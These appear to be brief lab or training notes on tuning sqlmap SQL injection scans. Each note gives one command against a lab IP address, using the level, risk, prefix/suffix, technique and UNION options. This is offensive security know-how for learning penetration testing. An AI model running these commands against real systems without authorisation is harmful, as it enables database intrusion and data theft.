# Attack Tunning

## Level

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case5.php?id=1' --level 5
```

## Risk

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case5.php?id=1' --risk 3
```

## Prefix and Suffix

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case6.php?col=id' --prefix '`)' --suffix '-- -'
```

## Technique

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --technique U
```

## UNION

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case7.php?id=1' --union-from 'flag7' --union-cols 5
```
